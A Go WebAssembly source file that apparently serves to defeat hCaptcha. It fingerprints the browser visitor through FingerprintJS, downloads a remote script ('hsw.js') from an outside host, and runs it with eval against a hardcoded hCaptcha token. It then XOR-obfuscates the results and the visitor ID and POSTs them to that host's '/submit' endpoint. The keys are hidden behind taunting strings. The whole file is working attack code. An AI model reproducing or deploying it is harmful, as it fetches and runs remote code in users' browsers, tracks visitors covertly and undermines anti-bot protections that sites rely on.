//go:build js && wasm
// +build js,wasm

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"syscall/js"
)

var (
	ServerDns = "https://nikolahellatrigger.solutions" //"nikolahellatrigger.solutions"
	visitorID = ""
)

func Decrypt(data, key string) (string, error) {
	decodedData, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", err
	}

	decryptedData := make([]byte, len(decodedData))
	keyBytes := []byte(key)

	for i := 0; i < len(decodedData); i++ {
		decryptedData[i] = decodedData[i] ^ keyBytes[i%len(keyBytes)]
	}

	decodedString, err := base64.StdEncoding.DecodeString(string(decryptedData))
	if err != nil {
		return "", err
	}

	return string(decodedString), nil
}

func Encrypt(data, key string) (string, error) {
	dataBytes := []byte(data)
	keyBytes := []byte(key)

	encryptedData := make([]byte, len(dataBytes))

	for i := 0; i < len(dataBytes); i++ {
		encryptedData[i] = dataBytes[i] ^ keyBytes[i%len(keyBytes)]
	}

	encodedString := base64.StdEncoding.EncodeToString(encryptedData)
	return encodedString, nil
}

func DoReq(Method string, Path string, Content map[string]string) string {
	jsonData, err := json.Marshal(Content)
	if err != nil {
		return ""
	}

	request, err := http.NewRequest(Method, fmt.Sprintf("%s%s", ServerDns, Path), bytes.NewBuffer(jsonData))
	if err != nil {
		return ""
	}

	request.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	_, err = client.Do(request)
	if err != nil {
		return ""
	}

	return ""
}

func getHsw() (string, error) {
	request, err := http.NewRequest("GET", fmt.Sprintf("%s%s", ServerDns, "/hsw.js"), nil)
	if err != nil {
		return "", err
	}

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}

	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func goFunction(this js.Value, p []js.Value) interface{} {
	go func() {
		visitorID = p[0].String()

		script, err := getHsw()
		if err != nil {
			panic(err)
		}

		js.Global().Call("eval", script)
		js.Global().Call("hsw", "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJmIjowLCJzIjoyLCJ0IjoidyIsImQiOiJwRnNucVRCRDd1KzlKQTdFa3J3SGFxWmczTXEzLzZqVnJwTkRKNHJCLzdHMlBPaFJFVGIwTE1VcnR0TVpMeXdNMXhBVnRoS0ZQTFhvV0pZbFU0MlBoOTdCL2JJQ210VDVuU3BNeDFPK3JmVXY0T2hhYzZFajFlN3poVXRkcnYrak1VWlc3MnE2ZWsvSXRSRElORXBSYytlSkJkZXZCbmRZYnc0aXlGNnJmaVE4VDJVWWpZWk5aaVhlZ3c9PVFnUUVNUFB1aXh6eGJVeWsiLCJsIjoiaHR0cHM6Ly9uZXdhc3NldHMuaGNhcHRjaGEuY29tL2MvYmY2MDBiZCIsImkiOiJzaGEyNTYtTmxDelZxSlVqYnFaWUxoYXRJKzZUVStDVzBOb3BUbVh6bGdmL21oMjk1Zz0iLCJlIjoxNjk1MjA0NjI3LCJuIjoiaHN3IiwiYyI6MTAwMH0.oYCpCwlytJdmAV0PNPaXAlA9DZvPmRd1_4w8KMysM9Y45YCwaPe0B8glnnhFYLusTvZfYXcXzkJN-lOjvtcyCSNZeX_K1FdJoKsTYb5MquGn9iGCeomAIrW5KlqM84_HRv2UA0QGgWSzvh0OUK14i5Yu2cM6gPkjNn0IpqbWrG8")
	}()

	return nil
}

func x12(this js.Value, p []js.Value) interface{} {
	clean, err := Decrypt(p[0].String(), "lmao15464notgonnagetthekeyifyes"+"youareagoodboy")
	if err != nil {
		return nil
	}

	n, err := Encrypt(clean, "1337superpass"+"lmaohowcanyoubegaylikethat")
	if err != nil {
		return nil
	}

	id, err := Encrypt(visitorID, "broisatryharder"+"lmao667")
	if err != nil {
		return nil
	}

	go func() {
		DoReq("POST", "/submit", map[string]string{
			"n":  n,
			"id": id,
		})
	}()
	return nil
}

func main() {
	c := make(chan struct{}, 0)

	js.Global().Set("goFunction", js.FuncOf(goFunction))
	js.Global().Set("x12", js.FuncOf(x12))

	jsCode := `
        const fpPromise = import('https://openfpcdn.io/fingerprintjs/v4').then(FingerprintJS => FingerprintJS.load());
        fpPromise.then(fp => fp.get()).then(result => {
            goFunction(result.visitorId);
        });
    `

	js.Global().Call("eval", jsCode)

	<-c
}
